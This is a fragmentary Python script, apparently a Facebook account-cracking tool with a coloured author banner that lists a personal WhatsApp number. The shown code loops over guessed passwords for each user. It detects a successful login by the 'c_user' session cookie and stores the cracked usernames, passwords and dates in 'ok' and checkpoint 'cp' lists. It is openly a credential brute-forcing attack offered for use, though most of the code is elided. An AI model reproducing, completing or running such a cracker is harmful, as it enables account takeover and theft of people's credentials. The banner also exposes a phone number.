...
\033[1;92m╔═════════════════════════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m TOUFIQ AHMED        \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m 01812027446         \033[1;31;1m █
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By Toufiq Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[TOUFIQ-CP] ", "")}{N}')
                try:
...
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[TOUFIQ]","\x1b[1;92m[RISAT]","\x1b[1;92m[RISAT]","\x1b[1;92m[RISAT]","\x1b[1;92m[RISAT]","\x1b[1;92m[RISAT]","\x1b[1;92m[RISAT]"])
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        wrt = '[TOUFIQ-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
